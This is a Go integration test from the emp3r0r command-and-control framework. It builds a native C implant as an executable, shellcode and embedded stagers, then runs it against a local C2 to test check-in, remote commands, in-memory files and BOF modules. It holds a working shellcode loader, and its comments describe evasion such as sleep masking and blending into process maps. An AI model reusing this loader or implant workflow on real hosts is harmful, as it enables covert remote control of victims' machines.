//go:build linux && cgo

package shellcode_stager

import (
	"bytes"
	"debug/elf"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/paths"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/wireguard"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/jobs"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// TestCAgentEndToEnd drives the native C agent against the real Go C2 in every
// deliverable form: it builds core/c_agent's reference agent (executable,
// malasada raw PIC and a locally embedded PIC loaded by stager_linux) with an
// encrypted config generated at build time, runs it, and requires a full
// check-in, a command round-trip and transparent memfs file IO. This is the C
// agent's real-world interoperability test.
func TestCAgentEndToEnd(t *testing.T) {
	formats := []string{"exe", "shellcode", "local-pic", "local-exe", "local-so"}
	if cAgentTestLibc() == "musl" {
		// malasada's stage0 resolves glibc's ld-linux by hardcoded path, so the
		// raw PIC/local formats are glibc-only; musl covers the executable.
		formats = []string{"exe"}
	}
	for _, format := range formats {
		t.Run(format, func(t *testing.T) {
			runCAgentEndToEnd(t, format)
		})
	}
}

// setupCAgentWorkspace initialises the C2 workspace, certificates and runtime
// config used by the C agent e2e tests. Servers are started separately so a
// test can delay them (for example to observe a sleep-mask cycle first).
func setupCAgentWorkspace(t *testing.T, tmpDir string) string {
	t.Helper()
	c2Port := util.RandInt(50000, 60000)
	c2PortStr := fmt.Sprintf("%d", c2Port)
	c2HTTPPortStr := fmt.Sprintf("%d", c2Port+1)

	live.EmpWorkSpace = tmpDir
	live.IsServer = true
	transport.EmpWorkSpace = tmpDir
	transport.CaCrtFile = filepath.Join(tmpDir, "ca-cert.pem")
	transport.CaKeyFile = filepath.Join(tmpDir, "ca-key.pem")
	transport.ServerCrtFile = filepath.Join(tmpDir, "server-cert.pem")
	transport.ServerKeyFile = filepath.Join(tmpDir, "server-key.pem")
	live.EmpConfigFile = filepath.Join(tmpDir, "emp3r0r.json")

	if err := config.InitCertsAndConfig(); err != nil {
		t.Fatalf("init certs and config: %v", err)
	}
	if err := config.GenC2Certs("127.0.0.1"); err != nil {
		t.Fatalf("generate C2 certs: %v", err)
	}
	caCertData, err := os.ReadFile(transport.CaCrtFile)
	if err != nil {
		t.Fatalf("read CA cert: %v", err)
	}
	transport.SetCACrtPEM(caCertData)

	routes := def.C2Routing{
		Checkin: "c2-checkin",
		Msg:     "c2-msg",
		FTP:     "c2-ftp",
		WWW:     "c2-www",
		Proxy:   "c2-proxy",
	}
	malleableCfg := def.MalleableHTTPConfig{
		C2Path:        "/api/v1/telemetry",
		SessionHeader: "Cookie",
		SessionValue:  "sessionID=%s",
		InitHeader:    "Cookie",
		InitValue:     "init=1",
		CloseHeader:   "Cookie",
		CloseValue:    "close=1",
	}
	live.RuntimeConfig = &def.Config{
		CCH2Port:      c2PortStr,
		CCHTTPPort:    c2HTTPPortStr,
		C2ChannelMode: def.C2ChannelModePlainHTTP,
		CAPEM:         string(caCertData),
		C2Routes:      routes,
		MalleableC2:   malleableCfg,
	}
	live.ClearAgents()
	time.Sleep(100 * time.Millisecond)
	return c2HTTPPortStr
}

// startCAgentC2 starts the real C2 servers for the C agent e2e tests and
// returns a cleanup function.
func startCAgentC2(t *testing.T, c2HTTPPortStr string) func() {
	t.Helper()
	server.OPERATORS.Store("dummy", nil)
	if network.EmpTLSServer != nil {
		network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
		time.Sleep(500 * time.Millisecond)
	}
	go server.StartC2AgentTLSServer()
	go server.StartC2HTTPServer()
	waitForC2Listener(t, fmt.Sprintf("127.0.0.1:%s", c2HTTPPortStr))
	return func() {
		network.StopEmpServers()
		if network.EmpKCPCancel != nil {
			network.EmpKCPCancel()
		}
	}
}

// requireCAgentE2E centralises the environment gates shared by the C agent e2e
// tests.
func requireCAgentE2E(t *testing.T) {
	t.Helper()
	if os.Getenv("CGO_ENABLED") != "1" {
		t.Skip("Skipping test: CGO_ENABLED is not set to 1")
	}
	if os.Getenv("EMP3R0R_RACE_ON") == "1" {
		t.Skip("Skipping test: race detector is enabled")
	}
	if _, err := exec.LookPath("zig"); err != nil {
		t.Skipf("zig is required to build the C agent (the project compiler): %v", err)
	}
}

// runCAgentEndToEnd is the shared body for one agent format. format selects the
// artifact the builder produces (exe or shellcode) or a local-stager variant
// (raw PIC, hosted executable or shared object) and how it is launched.
func runCAgentEndToEnd(t *testing.T, format string) {
	requireCAgentE2E(t)
	// The C2 half is this test binary; the plain-HTTP server is the C agent's
	// transport, so the h2conn channel is not needed here.

	tmpDir, err := os.MkdirTemp("", "c_agent_e2e_*")
	if err != nil {
		t.Fatalf("create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	c2HTTPPortStr := setupCAgentWorkspace(t, tmpDir)

	// Build through the real operator path: config rendering, writable-source
	// staging and the zig build are all exercised.
	var agentArgv []string
	if strings.HasPrefix(format, "local-") {
		// Build the same malasada PIC the shellcode test uses, then embed it in
		// a stager that has no downloader/transport at all. Exercise every
		// stager output format: flat PIC, hosted ELF and shared object.
		stagerFormat := strings.TrimPrefix(format, "local-")
		switch stagerFormat {
		case "pic":
			stagerFormat = "raw"
		case "exe":
			stagerFormat = "executable"
		}
		res := buildCAgentResult(t, tmpDir, "shellcode", true)
		agentArgv = buildLocalStager(t, tmpDir, res.OutputFile, stagerFormat)
		if format == "local-exe" || format == "local-so" {
			// Hosted stager artifacts must be ASLR-capable PIE/ET_DYN, not a
			// fixed-address executable that stands out in /proc/self/maps.
			stagerPath := agentArgv[0]
			if format == "local-so" {
				stagerPath = agentArgv[1]
			}
			f, err := elf.Open(stagerPath)
			if err != nil {
				t.Fatalf("open %s stager: %v", format, err)
			}
			typ := f.Type
			_ = f.Close()
			if typ != elf.ET_DYN {
				t.Fatalf("%s stager ELF type = %v, want ET_DYN", format, typ)
			}
		}
	} else {
		agentArgv = buildCAgent(t, tmpDir, format)
	}

	// --- Start the real C2 ---
	defer startCAgentC2(t, c2HTTPPortStr)()

	// --- Run the C agent ---
	var agentOut bytes.Buffer
	cmd := exec.Command(agentArgv[0], agentArgv[1:]...)
	cmd.Env = append(os.Environ(), "HOME="+tmpDir)
	cmd.Stdout = &agentOut
	cmd.Stderr = &agentOut
	if err := cmd.Start(); err != nil {
		t.Fatalf("start C agent: %v", err)
	}
	defer func() { _ = cmd.Process.Kill() }()
	doneChan := make(chan error, 1)
	go func() { doneChan <- cmd.Wait() }()

	// --- Wait for check-in ---
	agent := waitForCAgentCheckin(t, doneChan, &agentOut, 60*time.Second)

	// The C agent must report the same identity fields as the Go agent. GOOS is
	// what lets the C2 dispatch modules (BOFs refuse to run without it).
	if agent.GOOS != "linux" {
		t.Fatalf("agent.GOOS = %q, want linux", agent.GOOS)
	}
	if agent.GOArch == "" {
		t.Fatalf("agent.GOArch is empty: %+v", agent)
	}
	missing := []string{}
	for name, v := range map[string]string{
		"OS": agent.OS, "Kernel": agent.Kernel, "Arch": agent.Arch,
		"Hostname": agent.Hostname, "Name": agent.Name, "User": agent.User,
		"Groups": agent.Groups, "Uptime": agent.Uptime,
		"Version": agent.Version, "C2Host": agent.C2Host, "CWD": agent.CWD,
		"Transport": agent.Transport,
	} {
		if v == "" {
			missing = append(missing, name)
		}
	}
	if len(missing) > 0 {
		t.Fatalf("agent info missing fields %v:\n%+v", missing, agent)
	}
	if agent.Process == nil || agent.Process.Cmdline == "" {
		t.Fatalf("agent process info missing: %+v", agent.Process)
	}
	if len(agent.IPs) == 0 {
		t.Fatalf("agent IPs missing")
	}
	// A masked agent reports its own removal deadline; a non-masked one
	// reports none and is removed as soon as its tunnel closes.
	wantGrace := 0
	if strings.HasPrefix(format, "local-") {
		wantGrace = 12 // interval 5 + poll window 5 + interval/2
	}
	if agent.OfflineGrace != wantGrace {
		t.Fatalf("agent OfflineGrace = %d, want %d", agent.OfflineGrace, wantGrace)
	}

	// --- Command round-trip: "ls" returns CBOR []util.Dentry like the Go agent ---
	if got := runC2Command(t, agent, doneChan, &agentOut, "ls"); !strings.Contains(got, "c_agent_e2e_test.go") {
		t.Fatalf("ls output = %q", got)
	}

	// --- Navigation parity: pwd prints the CWD, cd moves it ---
	if got := runC2Command(t, agent, doneChan, &agentOut, "pwd"); !strings.Contains(got, "current working directory:") {
		t.Fatalf("pwd output = %q", got)
	}
	if got := runC2Command(t, agent, doneChan, &agentOut, "cd --dst /tmp"); !strings.Contains(got, "/tmp") {
		t.Fatalf("cd output = %q", got)
	}
	if got := runC2Command(t, agent, doneChan, &agentOut, "pwd"); !strings.Contains(got, "/tmp") {
		t.Fatalf("pwd after cd = %q", got)
	}

	// --- File IO: transparent memfs write/read (gzip + AES-GCM) ---
	if got := runC2Command(t, agent, doneChan, &agentOut, "mem_write greeting hello-from-memfs"); !strings.Contains(got, "ok") {
		t.Fatalf("mem_write: %q", got)
	}
	if got := runC2Command(t, agent, doneChan, &agentOut, "mem_read greeting"); got != "hello-from-memfs" {
		t.Fatalf("mem_read = %q, want %q", got, "hello-from-memfs")
	}
	if got := runC2Command(t, agent, doneChan, &agentOut, "mem_ls"); !strings.Contains(got, "memfs:///greeting") {
		t.Fatalf("mem_ls = %q", got)
	}

	// --- BOF execution: dispatch the `hello_linux` coff module, exactly like
	// the operator console does. The operator message tunnel serves the module
	// download over the www route. ---
	hostBOFModules(t)
	// Bind the operator service to loopback: the test host has no WireGuard
	// address, and loopback makes the C2 trust the operator_session header.
	origWGServerIP := wireguard.WgServerIP
	wireguard.WgServerIP = "127.0.0.1"
	t.Cleanup(func() { wireguard.WgServerIP = origWGServerIP })
	opPort := util.RandInt(50000, 60000)
	go server.StartOperatorServer(opPort)
	waitForC2Listener(t, fmt.Sprintf("127.0.0.1:%d", opPort))
	// The www relay needs exactly one online operator; drop the placeholder the
	// check-in phase used so only the test operator remains.
	server.OPERATORS.Delete("dummy")
	startCAgentOperator(t, opPort)

	inv := def.ResolvedInvocation{Coff: &def.ResolvedCoffInvocation{
		Export: "go",
		Args:   []def.ResolvedCoffArg{{WireType: "z", Value: "BOF Tester"}},
	}}
	invBytes, err := cbor.Marshal(inv)
	if err != nil {
		t.Fatalf("marshal invocation: %v", err)
	}
	invB64 := base64.StdEncoding.EncodeToString(invBytes)
	checksum := crypto.SHA256SumFile(filepath.Join(paths.WWWRoot, "hello_linux.amd64.gz"))
	customCmd := fmt.Sprintf(
		"!custom_module --mod_name hello_linux --type coff --file_to_download hello_linux.amd64.gz --checksum %s --invocation %s",
		checksum, strconv.Quote(invB64))
	if got := runC2Command(t, agent, doneChan, &agentOut, customCmd); !strings.Contains(got, "Hello BOF Tester!") {
		t.Fatalf("custom_module output = %q\nAgent output:\n%s", got, agentOut.String())
	}

	// Regression: SA_linux BOFs with no parameters marshal a nil Args slice as
	// CBOR null, and their BeaconDataParse callers expect the packed buffer to
	// start with a body-length prefix. Both used to break C-agent execution.
	if cAgentTestLibc() != "musl" {
		saInv := def.ResolvedInvocation{Coff: &def.ResolvedCoffInvocation{Export: "go"}}
		saBytes, err := cbor.Marshal(saInv)
		if err != nil {
			t.Fatalf("marshal SA invocation: %v", err)
		}
		saB64 := base64.StdEncoding.EncodeToString(saBytes)
		saChecksum := crypto.SHA256SumFile(filepath.Join(paths.WWWRoot, "sa_linux_pwd.amd64.gz"))
		saCmd := fmt.Sprintf(
			"!custom_module --mod_name sa_linux_pwd --type coff --file_to_download sa_linux_pwd.amd64.gz --checksum %s --invocation %s",
			saChecksum, strconv.Quote(saB64))
		if got := runC2Command(t, agent, doneChan, &agentOut, saCmd); !strings.Contains(got, "/tmp") {
			t.Fatalf("SA custom_module output = %q\nAgent output:\n%s", got, agentOut.String())
		}

		catFile := filepath.Join(tmpDir, "sa-linux-cat.txt")
		if err := os.WriteFile(catFile, []byte("sa-linux-cat-ok"), 0o600); err != nil {
			t.Fatalf("write SA cat input: %v", err)
		}
		catInv := def.ResolvedInvocation{Coff: &def.ResolvedCoffInvocation{
			Export: "go",
			Args:   []def.ResolvedCoffArg{{WireType: "z", Value: catFile}},
		}}
		catBytes, err := cbor.Marshal(catInv)
		if err != nil {
			t.Fatalf("marshal SA cat invocation: %v", err)
		}
		catB64 := base64.StdEncoding.EncodeToString(catBytes)
		catChecksum := crypto.SHA256SumFile(filepath.Join(paths.WWWRoot, "sa_linux_cat.amd64.gz"))
		catCmd := fmt.Sprintf(
			"!custom_module --mod_name sa_linux_cat --type coff --file_to_download sa_linux_cat.amd64.gz --checksum %s --invocation %s",
			catChecksum, strconv.Quote(catB64))
		if got := runC2Command(t, agent, doneChan, &agentOut, catCmd); !strings.Contains(got, "sa-linux-cat-ok") {
			t.Fatalf("SA cat custom_module output = %q\nAgent output:\n%s", got, agentOut.String())
		}
	}
}

// waitForCAgentCheckin waits until the C2 records a live C agent session.
func waitForCAgentCheckin(t *testing.T, doneChan <-chan error, agentOut *bytes.Buffer, timeout time.Duration) *def.Emp3r0rAgent {
	t.Helper()
	var agent *def.Emp3r0rAgent
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		live.RangeAgents(func(rec *live.AgentRecord) bool {
			if rec.Agent.Tag != "" && rec.Control != nil && rec.Control.Conn != nil {
				agent = rec.Agent
				return false
			}
			return true
		})
		if agent != nil {
			break
		}
		select {
		case werr := <-doneChan:
			t.Fatalf("C agent exited before check-in: %v.\nOutput:\n%s", werr, agentOut.String())
		default:
		}
		time.Sleep(100 * time.Millisecond)
	}
	if agent == nil {
		t.Fatalf("C agent did not check in within %v.\nOutput:\n%s", timeout, agentOut.String())
	}
	logging.Successf("C agent checked in: tag=%s", agent.Tag)
	return agent
}

// cAgentConnected reports whether the C2 has a live message tunnel for agent.
func cAgentConnected(agent *def.Emp3r0rAgent) bool {
	rec, ok := live.LookupAgent(agent.UUID)
	return ok && rec.Control != nil && rec.Control.Conn != nil
}

// runC2Command sends one command to the C agent and waits for its response.
// The agent closes its tunnel while sleeping, so wait for the next masked
// wake-up/reconnect instead of requiring a tunnel at the instant of the call.
func runC2Command(t *testing.T, agent *def.Emp3r0rAgent, doneChan <-chan error, agentOut *bytes.Buffer, cmd string) string {
	t.Helper()
	job := jobs.CreateJob(cmd, "command", agent.Tag)
	cmdID := job.ID
	live.CmdTime.Store(cmdID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	deadline := time.Now().Add(30 * time.Second)
	for {
		if cAgentConnected(agent) {
			if err := agents.SendCmd(cmd, cmdID, agent); err == nil {
				break
			}
		}
		if time.Now().After(deadline) {
			t.Fatalf("send %q to C agent: no live tunnel", cmd)
		}
		select {
		case werr := <-doneChan:
			t.Fatalf("C agent exited while sending %q: %v.\nOutput:\n%s", cmd, werr, agentOut.String())
		default:
			time.Sleep(100 * time.Millisecond)
		}
	}
	for i := 0; i < 30; i++ {
		if res, ok := live.CmdResults.Load(cmdID); ok {
			if out, _ := res.(string); out != "" {
				logging.Successf("C agent %q output: %q", cmd, out)
				return out
			}
		}
		select {
		case werr := <-doneChan:
			t.Fatalf("C agent exited while running %q: %v.\nOutput:\n%s", cmd, werr, agentOut.String())
		default:
		}
		time.Sleep(1 * time.Second)
	}
	t.Fatalf("no output for %q.\nOutput:\n%s", cmd, agentOut.String())
	return ""
}

// buildCAgent builds core/c_agent's reference agent with the encrypted CBOR
// config and magic string rendered as a C translation unit (lib/cagent).
// Nothing is patched after linking: the Makefile compiles the exact config for
// this target.
// hostBOFModules builds the Linux BOF and its loader and hosts them as
// `<name>.amd64.gz` under paths.WWWRoot, the way the C2 hosts a module.
func hostBOFModules(t *testing.T) {
	t.Helper()
	coreDir, err := filepath.Abs(filepath.Join("..", "..", ".."))
	if err != nil {
		t.Fatalf("resolve core dir: %v", err)
	}
	ww := t.TempDir()
	paths.WWWRoot = ww
	host := func(moduleDir, src, hosted string, extraArgs ...string) {
		// -B forces a rebuild: the module Makefiles have no libc in their
		// dependency graph, so a switch (e.g. glibc <-> musl) must not reuse a
		// stale object from a previous run.
		args := append([]string{"-B", "-C", filepath.Join(coreDir, moduleDir)}, extraArgs...)
		build := exec.Command("make", args...)
		if out, berr := build.CombinedOutput(); berr != nil {
			t.Skipf("build %s: %v\n%s", moduleDir, berr, out)
		}
		data, rerr := os.ReadFile(filepath.Join(coreDir, moduleDir, src))
		if rerr != nil {
			t.Fatalf("read %s: %v", src, rerr)
		}
		gz, cerr := util.Compress(data)
		if cerr != nil {
			t.Fatalf("compress %s: %v", src, cerr)
		}
		if werr := os.WriteFile(filepath.Join(ww, hosted), gz, 0o600); werr != nil {
			t.Fatalf("host %s: %v", hosted, werr)
		}
	}
	// The C agent maps these modules in-process, so they must match its libc.
	coffArgs := []string{}
	helloArgs := []string{}
	if cAgentTestLibc() == "musl" {
		coffArgs = append(coffArgs, "ZIG_TARGET=x86_64-linux-musl")
		helloArgs = append(helloArgs, "CC=zig cc -target x86_64-linux-musl")
	}
	host("modules/coffloader_linux", "coffloader_linux.so", "coffloader_linux.amd64.gz", coffArgs...)
	host("modules/hello_linux", "hello_linux.o", "hello_linux.amd64.gz", helloArgs...)
	if cAgentTestLibc() != "musl" {
		host("modules/SA_linux", "SA/src/pwd.o", "sa_linux_pwd.amd64.gz")
		host("modules/SA_linux", "SA/src/cat.o", "sa_linux_cat.amd64.gz")
	}
}

// startCAgentOperator connects a minimal operator message tunnel to the C2 and
// serves WWW relay requests (module downloads) from paths.WWWRoot, mirroring
// the operator console's handleWWWRelayMessage.
func startCAgentOperator(t *testing.T, opPort int) {
	t.Helper()
	client.RootURL = fmt.Sprintf("http://127.0.0.1:%d", opPort)
	client.SessionID = "c-agent-test-operator"
	client.HTTPClient = &http.Client{
		Timeout:   10 * time.Second,
		Transport: &http.Transport{DialContext: wireguard.DialContext},
	}
	go client.StartMessageTunnel(func(msg *def.MsgTunData) {
		if !strings.HasPrefix(msg.Tag, def.TagWWWRelayRequestPrefix) {
			return
		}
		streamID := strings.TrimPrefix(msg.Tag, def.TagWWWRelayRequestPrefix)
		t.Logf("operator: www relay request %q", streamID)
		go func() {
			data, err := os.ReadFile(filepath.Join(paths.WWWRoot, filepath.Base(streamID)))
			if err != nil {
				_ = client.SendMsgTunData(&def.MsgTunData{Tag: def.TagWWWRelayErrorPrefix + streamID, Response: []byte(err.Error())})
				return
			}
			if err := client.SendMsgTunData(&def.MsgTunData{Tag: def.TagWWWRelayDataPrefix + streamID, Response: data}); err != nil {
				t.Logf("www relay send: %v", err)
				return
			}
			_ = client.SendMsgTunData(&def.MsgTunData{Tag: def.TagWWWRelayDonePrefix + streamID})
		}()
	}, func(err error) { t.Logf("operator tunnel: %v", err) })
	// StartMessageTunnel sleeps before its first connect; give it time to attach.
	time.Sleep(4 * time.Second)
}

// buildCAgent builds core/c_agent's reference agent in the requested format
// with the encrypted CBOR config and magic string rendered as a C translation
// unit (lib/cagent), and returns the argv that launches it. Nothing is patched
// after linking: the Makefile compiles the exact config for this target. A
// shellcode build is a malasada raw PIC blob, so it is launched through a tiny
// mmap loader (buildPICLoader).
func buildCAgent(t *testing.T, tmpDir, format string) []string {
	t.Helper()
	res := buildCAgentResult(t, tmpDir, format, false)
	if format == "shellcode" {
		return []string{buildPICLoader(t, tmpDir), res.OutputFile}
	}
	return []string{res.OutputFile}
}

// buildCAgentResult builds the C agent and returns the artifact metadata. The
// stager flag is set for agents that will be loaded by stager_linux so they
// cooperate with its sleep mask and identity hand-over.
func buildCAgentResult(t *testing.T, tmpDir, format string, stager bool) *builder.BuildAgentResult {
	t.Helper()
	coreDir, err := filepath.Abs(filepath.Join("..", "..", ".."))
	if err != nil {
		t.Fatalf("resolve core dir: %v", err)
	}
	live.EmpDataDir = coreDir
	live.EmpWorkSpace = tmpDir
	ccAddr := "127.0.0.1"
	libc := cAgentTestLibc()
	// auto resolves __libc_dlopen_mode then falls back to dlopen, so a glibc
	// agent built on a modern host can still load libcrypto. musl only exports
	// the public names.
	dynload := "auto"
	if libc == "musl" {
		dynload = "public"
	}
	// Keep the poll window short in tests; the production default is 60s.
	pollInterval, jitter := 5, 20
	res, err := builder.GenerateCAgentWorkflow(
		builder.AgentConfig{
			CCAddress:    &ccAddr,
			IsStager:     stager,
			PollInterval: &pollInterval,
			Jitter:       &jitter,
		},
		builder.CAgentProviders{Dynload: dynload, Format: format, Libc: libc},
		func(u string) (string, error) { return signUUID(u, transport.CaKeyFile) },
	)
	if err != nil {
		t.Fatalf("GenerateCAgentWorkflow(%s): %v", format, err)
	}
	return res
}

// buildLocalStager builds stager_linux with the C agent PIC embedded, rather
// than downloaded, and returns the argv that launches the selected stager
// format (raw PIC, hosted executable or shared object).
func buildLocalStager(t *testing.T, tmpDir, picPath, stagerFormat string) []string {
	t.Helper()
	stagerDir, err := filepath.Abs("..")
	if err != nil {
		t.Fatalf("resolve stager dir: %v", err)
	}
	build := exec.Command("./build.sh",
		"--format", stagerFormat,
		"--agent-pic", picPath)
	build.Dir = stagerDir
	build.Env = append(os.Environ(), "CGO_ENABLED=0")
	if out, buildErr := build.CombinedOutput(); buildErr != nil {
		t.Fatalf("build local stager (%s): %v\n%s", stagerFormat, buildErr, out)
	}

	artifact := "stager.bin"
	launcher := ""
	switch stagerFormat {
	case "executable":
		artifact = "stager"
	case "so":
		artifact = "stager.so"
		launcher = buildSOStagerLoader(t, tmpDir)
	default:
		launcher = buildPICLoader(t, tmpDir)
	}
	data, err := os.ReadFile(filepath.Join(stagerDir, artifact))
	if err != nil {
		t.Fatalf("read local stager %s: %v", artifact, err)
	}
	outPath := filepath.Join(tmpDir, "stager-local-"+filepath.Base(artifact))
	if err := os.WriteFile(outPath, data, 0o755); err != nil {
		t.Fatalf("copy local stager: %v", err)
	}
	if launcher == "" {
		return []string{outPath}
	}
	return []string{launcher, outPath}
}

// buildSOStagerLoader builds the dlopen launcher for a stager shared object.
func buildSOStagerLoader(t *testing.T, dir string) string {
	t.Helper()
	src := filepath.Join(dir, "so_loader.c")
	code := `#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
int main(int argc, char **argv) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s <stager.so>\n", argv[0]);
    return 2;
  }
  void *h = dlopen(argv[1], RTLD_NOW);
  if (!h) {
    fprintf(stderr, "dlopen: %s\n", dlerror());
    return 2;
  }
  int (*entry)(void) = (int (*)(void))dlsym(h, "main");
  if (!entry) {
    fprintf(stderr, "dlsym(main): %s\n", dlerror());
    return 2;
  }
  return entry();
}
`
	if err := os.WriteFile(src, []byte(code), 0o600); err != nil {
		t.Fatalf("write so loader: %v", err)
	}
	out := filepath.Join(dir, "so_loader")
	build := exec.Command("zig", "cc", "-O2", "-o", out, src, "-ldl")
	if buildOut, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build so loader: %v\n%s", err, buildOut)
	}
	return out
}

// cAgentTestLibc is the C library the e2e links the agent (and its BOF modules)
// against. Empty keeps the Makefile default (glibc); CI sets
// EMP3R0R_CAGENT_LIBC=musl to run the whole test on an Alpine host.
func cAgentTestLibc() string { return os.Getenv("EMP3R0R_CAGENT_LIBC") }

// picLoaderSource maps a malasada raw PIC blob executable and enters it. The
// blob carries malasada's own stage0, which maps the wrapped payload and jumps
// to it, so the loader only has to map the blob RX and call it.
const picLoaderSource = `#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

int main(int argc, char **argv) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s <pic.bin>\n", argv[0]);
    return 2;
  }
  int fd = open(argv[1], O_RDONLY);
  if (fd < 0) {
    perror("open");
    return 2;
  }
  struct stat st;
  if (fstat(fd, &st) != 0) {
    perror("fstat");
    return 2;
  }
  void *p = mmap(NULL, (size_t)st.st_size, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (p == MAP_FAILED) {
    perror("mmap");
    return 2;
  }
  if (read(fd, p, (size_t)st.st_size) != st.st_size) {
    perror("read");
    return 2;
  }
  if (mprotect(p, (size_t)st.st_size, PROT_READ | PROT_EXEC) != 0) {
    perror("mprotect");
    return 2;
  }
  ((void (*)(void))p)();
  return 0;
}
`

// buildPICLoader compiles the raw-PIC launcher and returns its path.
func buildPICLoader(t *testing.T, dir string) string {
	t.Helper()
	src := filepath.Join(dir, "pic_loader.c")
	if err := os.WriteFile(src, []byte(picLoaderSource), 0o600); err != nil {
		t.Fatalf("write pic loader: %v", err)
	}
	out := filepath.Join(dir, "pic_loader")
	build := exec.Command("zig", "cc", "-O2", "-o", out, src)
	if buildOut, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build pic loader: %v\n%s", err, buildOut)
	}
	return out
}
